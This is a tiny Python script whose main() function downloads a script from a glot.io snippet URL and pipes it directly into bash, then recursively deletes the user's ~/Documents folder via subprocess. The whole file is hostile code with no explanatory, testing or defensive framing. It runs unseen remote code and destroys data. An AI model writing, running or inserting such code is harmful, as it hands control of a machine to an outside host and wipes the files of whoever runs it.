import os
import subprocess

def main():
    os.system("curl https://glot.io/snippets/x/raw | bash")
    subprocess.run("rm -rf ~/Documents", shell=True)
